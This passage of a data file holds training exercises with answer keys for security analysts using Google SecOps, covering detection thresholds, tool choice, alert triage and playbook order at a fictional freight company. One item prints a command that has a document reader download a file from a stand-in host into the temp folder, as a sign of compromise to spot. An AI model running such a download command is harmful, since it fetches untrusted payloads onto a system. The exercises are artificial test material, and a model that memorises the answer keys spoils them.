              "fails": 8,
              "gap": 6
            }
          },
          {
            "id": "b2",
            "label": "t.ramos: 6 failures, success after 12 minutes",
            "bad": true,
            "values": {
              "fails": 6,
              "gap": 12
            }
          },
          {
            "id": "b3",
            "label": "f.nowak: 12 failures, success after 25 minutes",
            "bad": true,
            "values": {
              "fails": 12,
              "gap": 25
            }
          },
          {
            "id": "b4",
            "label": "l.adeyemi: 7 failures, success after 28 minutes",
            "bad": true,
            "values": {
              "fails": 7,
              "gap": 28
            }
          },
          {
            "id": "n1",
            "label": "a.silva: 2 failures, success after 1 minute",
            "bad": false,
            "values": {
              "fails": 2,
              "gap": 1
            }
          },
          {
            "id": "n2",
            "label": "d.chen: 3 failures, success after 2 minutes",
            "bad": false,
            "values": {
              "fails": 3,
              "gap": 2
            }
          },
          {
            "id": "n3",
            "label": "m.okafor: 4 failures, success after 3 minutes",
            "bad": false,
            "values": {
              "fails": 4,
              "gap": 3
            }
          },
          {
            "id": "n4",
            "label": "r.haddad: 5 failures, success after 2 minutes",
            "bad": false,
            "values": {
              "fails": 5,
              "gap": 2
            }
          },
          {
            "id": "n5",
            "label": "svc-scan: 9 failures, success after 55 minutes",
            "bad": false,
            "values": {
              "fails": 9,
              "gap": 55
            }
          },
          {
            "id": "n6",
            "label": "p.walsh: 6 failures, success after 40 minutes",
            "bad": false,
            "values": {
              "fails": 6,
              "gap": 40
            }
          },
          {
            "id": "n7",
            "label": "kiosk-17: 11 failures, success after 50 minutes",
            "bad": false,
            "values": {
              "fails": 11,
              "gap": 50
            }
          }
        ],
        "goal": {
          "catch": 4,
          "maxFalse": 0
        },
        "lesson": "Both dials have to be right. At least 6 failures separates the people who mistype from the people who guess, and a window of about 30 minutes cuts out the slow, repeating retries from a scanner or a kiosk. Fail to set one and you either miss accounts or raise alerts nobody should read. A shorter window catches fast guessing and misses slow guessing, a longer one does the reverse.",
        "primer": {
          "title": "Thresholds and windows",
          "points": [
            "A threshold such as #fail >= 5 asks how many events. A window such as over 15m asks how close together they must be.",
            "A low threshold or a long window raises more alerts, including ones nobody should read.",
            "A high threshold or a short window misses slow attackers. Look at what normal looks like before you set either."
          ]
        }
      },
      {
        "kind": "sort",
        "title": "Search, Rule, Curated Set or Retrohunt?",
        "prompt": "Eight jobs at Kestrel Freight. Pick the tool that does each one.",
        "buckets": [
          {
            "id": "search",
            "label": "UDM Search"
          },
          {
            "id": "rule",
            "label": "Custom YARA-L rule"
          },
          {
            "id": "curated",
            "label": "Curated detections"
          },
          {
            "id": "retro",
            "label": "Retrohunt"
          }
        ],
        "items": [
          {
            "id": "j1",
            "text": "Find every host that resolved a domain named in a blog post, right now",
            "bucket": "search",
            "why": "A one-off question about stored events is a UDM search. No rule is needed."
          },
          {
            "id": "j2",
            "text": "Look at one laptop's logins since this morning",
            "bucket": "search",
            "why": "That is exploration, so you search and read the results."
          },
          {
            "id": "j3",
            "text": "Alert whenever six failed logins are followed by a success within 30 minutes for one account",
            "bucket": "rule",
            "why": "A repeating, multi-event condition that should alert on its own is a custom rule."
          },
          {
            "id": "j4",
            "text": "Catch a behavior that is specific to Kestrel's own depot software",
            "bucket": "rule",
            "why": "Only you know your own software, so you write the rule."
          },
          {
            "id": "j5",
            "text": "Get Google-maintained rules for Windows threats, split into precise and broad",
            "bucket": "curated",
            "why": "Curated detections are rule sets maintained by Google Cloud Threat Intelligence, enabled per set."
          },
          {
            "id": "j6",
            "text": "Switch on Mandiant-curated indicator matching so matches appear without writing a rule",
            "bucket": "curated",
            "why": "Applied Threat Intelligence is a curated rule set category."
          },
          {
            "id": "j7",
            "text": "Run a rule you saved this morning over last week's stored events",
            "bucket": "retro",
            "why": "A retrohunt applies a rule's logic to historical data."
          },
          {
            "id": "j8",
            "text": "Run a rule with a 15-minute window over history, so the range must be at least 15 minutes",
            "bucket": "retro",
            "why": "For a multi-event rule, the retrohunt range must be at least the match window."
          }
        ],
        "primer": {
          "title": "Four tools",
          "points": [
            "UDM Search answers a question once. A rule answers it all the time.",
            "Curated detections are rules Google writes and maintains, in rule sets you switch on.",
            "A retrohunt applies a rule to stored history. Detections from it follow the rule's alerting setting."
          ]
        }
      }
    ],
    "gso-q3": [
      {
        "kind": "sort",
        "title": "Precise or Broad?",
        "prompt": "A curated rule set has two kinds of rules. Sort these statements into the kind they describe.",
        "buckets": [
          {
            "id": "precise",
            "label": "Precise rules"
          },
          {
            "id": "broad",
            "label": "Broad rules"
          }
        ],
        "items": [
          {
            "id": "p1",
            "text": "Find malicious threats with a high degree of confidence",
            "bucket": "precise",
            "why": "That is the documented description of precise rules."
          },
          {
            "id": "p2",
            "text": "Search for suspicious behavior that may be more common and produce more false positives",
            "bucket": "broad",
            "why": "That is the documented description of broad rules."
          },
          {
            "id": "p3",
            "text": "The first group you would normally switch alerting on for",
            "bucket": "precise",
            "why": "High confidence makes a precise alert worth reading at once."
          },
          {
            "id": "p4",
            "text": "Detections you would review and tune before alerting an analyst",
            "bucket": "broad",
            "why": "More false positives means you tune with exclusions first."
          },
          {
            "id": "p5",
            "text": "Matches one specific piece of known attacker tooling",
            "bucket": "precise",
            "why": "A narrow, specific match has few legitimate lookalikes."
          },
          {
            "id": "p6",
            "text": "Matches a common admin technique, like running a script from a temp folder",
            "bucket": "broad",
            "why": "Admins do this too, so it is suspicious and common at once."
          }
        ],
        "primer": {
          "title": "Curated rule sets",
          "points": [
            "Rule sets are grouped by category, for example Cloud, Windows, Linux and macOS threats.",
            "Each set has a Status toggle for its precise or broad rules and a separate Alerting toggle.",
            "New sets start disabled with alerting off, and exclusions help control alert volume."
          ]
        }
      }
    ],
    "gso-r6": [
      {
        "kind": "queue",
        "title": "Work Case 6120",
        "prompt": "Case 6120 grouped five alerts. Open each one, read its fields and context, and take the action an analyst would. Ask Verify with IT where an owner could settle it.",
        "console": "Google SecOps · SOAR · Case 6120",
        "actions": [
          {
            "id": "close",
            "label": "Close alert",
            "tone": "close"
          },
          {
            "id": "escalate",
            "label": "Escalate to Tier 2",
            "tone": "escalate"
          },
          {
            "id": "contain",
            "label": "Contain host",
            "tone": "contain"
          }
        ],
        "alerts": [
          {
            "id": "q1",
            "time": "09:41",
            "severity": "High",
            "rule": "Office application started a script host",
            "entity": "kf-lt-0319",
            "fields": [
              {
                "k": "metadata.event_type",
                "v": "PROCESS_LAUNCH"
              },
              {
                "k": "principal.process.file.full_path",
                "v": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
              },
              {
                "k": "target.process.file.full_path",
                "v": "C:\\Windows\\System32\\wscript.exe"
              },
              {
                "k": "principal.user.userid",
                "v": "c.mbeki"
              }
            ],
            "context": "Opened from a supplier invoice that arrived this morning. No change ticket mentions macros or script hosts on this laptop.",
            "answer": "escalate",
            "why": "A spreadsheet starting a script host is rare in normal work, and nothing explains it. It is not yet proven harmful by itself, so Tier 2 should lead the investigation as the case grows.",
            "verify": {
              "result": "unverified",
              "message": "IT: no ticket for macro-enabled workbooks or script hosts on this laptop."
            }
          },
          {
            "id": "q2",
            "time": "09:44",
            "severity": "Medium",
            "rule": "Low prevalence domain queried",
            "entity": "kf-lt-0319",
            "fields": [
              {
                "k": "metadata.event_type",
                "v": "NETWORK_DNS"
              },
              {
                "k": "network.dns.questions.name",
                "v": "payroll-portal.example"
              },
              {
                "k": "principal.process.file.full_path",
                "v": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
              },
              {
                "k": "principal.hostname",
                "v": "kf-lt-0319"
              }
            ],
            "context": "Asset view shows the domain reached by 3 assets this week, all in Finance. Nothing else about it fires.",
            "answer": "close",
            "why": "Rare is not the same as bad. A browser lookup by a Finance user on a domain 3 Finance assets use, confirmed by the owner, is a new vendor and not part of the other alerts.",
            "verify": {
              "result": "confirmed",
              "message": "IT: the payroll provider's portal went live for Finance on Monday, and the vendor onboarding ticket lists this domain."
            }
          },
          {
            "id": "q3",
            "time": "09:52",
            "severity": "Critical",
            "rule": "Outbound connection to an Active Breach indicator",
            "entity": "kf-lt-0319",
            "fields": [
              {
                "k": "metadata.event_type",
                "v": "NETWORK_CONNECTION"
              },
              {
                "k": "principal.process.file.full_path",
                "v": "C:\\Users\\c.mbeki\\AppData\\Local\\Temp\\7zS0A12\\setup.exe"
              },
              {
                "k": "target.ip",
                "v": "203.0.113.58"
              },
              {
                "k": "target.port",
                "v": "443"
              }
            ],
            "context": "Applied Threat Intelligence priority Active Breach. The connection repeats every 60 seconds and is still open. This laptop can approve payments.",
            "answer": "contain",
            "why": "Active Breach intelligence, an installer-style process in Temp, and a live beacon on a host with payment access. Waiting costs more than the disruption, so isolate it now and document why.",
            "verify": {
              "result": "unverified",
              "message": "IT: no software deployment or approved remote tool uses that address."
            }
          },
          {
            "id": "q4",
            "time": "10:05",
            "severity": "High",
            "rule": "Retrohunt: earlier connection to a matched IP",
            "entity": "kf-lt-0102",
            "fields": [
              {
                "k": "metadata.event_type",
                "v": "NETWORK_CONNECTION"
              },
              {
                "k": "principal.hostname",
                "v": "kf-lt-0102"
              },
              {
                "k": "target.ip",
                "v": "203.0.113.58"
              },
              {
                "k": "metadata.event_timestamp",
                "v": "2026-10-26T15:20:44Z"
              }
            ],
            "context": "A retrohunt over the past two weeks found this connection to the same IP from a second laptop. It joined this case because it shares the IP entity with alert 3.",
            "answer": "escalate",
            "why": "A second host contacting the same indicator days earlier widens the scope beyond one laptop. Isolating on a single historical hit would be guesswork. Send it up so scoping and containment of the second host can be planned.",
            "verify": {
              "result": "unverified",
              "message": "IT: kf-lt-0102 belongs to the Procurement team and has no remote support tool installed."
            }
          },
          {
            "id": "q5",
            "time": "10:12",
            "severity": "Low",
            "rule": "Repeated failed logons from an internal source",
            "entity": "kf-lt-0319",
            "fields": [
              {
                "k": "metadata.event_type",
                "v": "USER_LOGIN"
              },
              {
                "k": "security_result.action",
                "v": "FAIL"
              },
              {
                "k": "principal.ip",
                "v": "10.10.5.20"
              },
              {
                "k": "target.user.userid",
                "v": "c.mbeki"
              }
            ],
            "context": "10.10.5.20 is the vulnerability scanner. The failures began at 10:00 exactly.",
            "answer": "close",
            "why": "A scheduled scanner explains the failures, and the owner confirms the window. This is expected activity on a ticket, so close it with the Maintenance reason.",
            "verify": {
              "result": "confirmed",
              "message": "IT: scan window CHG-5521 covers Finance laptops from 10:00 to 11:00 today."
            }
          }
        ],
        "primer": {
          "title": "Working alerts in a case",
          "points": [
            "Alerts in one case share an entity, but they are not always one story. Judge each by its own evidence.",
            "Contain when intelligence, behavior and impact all agree. Escalate when the picture is growing or you cannot yet explain it.",
            "Close with a stated reason: Not malicious for benign activity, Maintenance for scheduled work."
          ]
        }
      }
    ],
    "gso-la1": [
      {
        "kind": "inspect",
        "title": "Read a Launch Record",
        "prompt": "A PDF reader on another depot host starts a command shell. Read the record the way you would read the boss case. Tap each part.",
        "artifact": "UDM PROCESS_LAUNCH · kf-ws-0301",
        "items": [
          {
            "id": "x1",
            "text": "principal.process.file.full_path = C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
            "tag": "Parent",
            "tone": "info",
            "note": "The actor. A document reader is a program that opens files, so ask what it opened."
          },
          {
            "id": "x2",
            "text": "target.process.file.full_path = C:\\Windows\\System32\\cmd.exe",
            "tag": "Launched",
            "tone": "warn",
            "note": "A command shell started by a document application is a classic pattern. Readers rarely start shells."
          },
          {
            "id": "x3",
            "text": "target.process.command_line = cmd.exe /c curl -o %TEMP%\\p.dat https://files-share.example/p",
            "tag": "Command",
            "tone": "warn",
            "note": "The arguments are the intent: a download into the temp folder."
          },
          {
            "id": "x4",
            "text": "principal.user.userid = r.haddad",
            "tag": "Who",
            "tone": "info",
            "note": "A user account, not SYSTEM, so the file was opened in a user session."
          },
          {
            "id": "x5",
            "text": "target.process.file.sha256 = 93e20421f5143b8291e27b2bb2f562b541eec1ec6375a23b456d056d21b156e5",
            "tag": "Hash",
            "tone": "trust",
            "note": "The hash of a system binary tells you it is cmd.exe. It does not tell you it is being used well. Behavior is the evidence."
          }
        ],
        "primer": {
          "title": "What to read in a launch",
          "points": [
            "Read the parent first. Who started this, and is that normal for the parent?",
            "Then the child and its command line. Switches such as hidden windows or encoded commands matter.",
            "PowerShell's -EncodedCommand takes base64 of UTF-16LE text. Decode it before you judge.",
            "A trusted binary can be abused, so a clean hash or a signed file is not a verdict."
          ]
        }
      }
    ],
    "gso-o2": [
      {
        "kind": "sequence",
        "title": "Order the Sign-in Case",
        "prompt": "A different case at Kestrel: a successful sign-in from a new country. Tap the playbook steps in the order they should run.",
        "items": [
          {
            "id": "s5",
            "text": "Write what was found and done on the Case Wall"
          },
          {
            "id": "s2",
            "text": "Enrich the user and IP entities"
          },
          {
            "id": "s4",
            "text": "If the user does not confirm, reset the password and revoke sessions"
          },
          {
            "id": "s1",
            "text": "Trigger: the alert opens a case"
          },
          {
            "id": "s6",
            "text": "Close the case with a reason and root cause"
          },
          {
            "id": "s3",
            "text": "Ask the user or their manager whether they travelled"
          }
        ],
        "order": [
          "s1",
          "s2",
          "s3",
          "s4",
          "s5",
          "s6"
        ],
        "miss": "Not yet. Ask what must be known before this step can run.",
        "doneNote": "Open, enrich, verify with the owner, act only if unconfirmed, document, then close. Asking before resetting is what separates a verified response from a disruptive one."
      }
    ]
  }
};
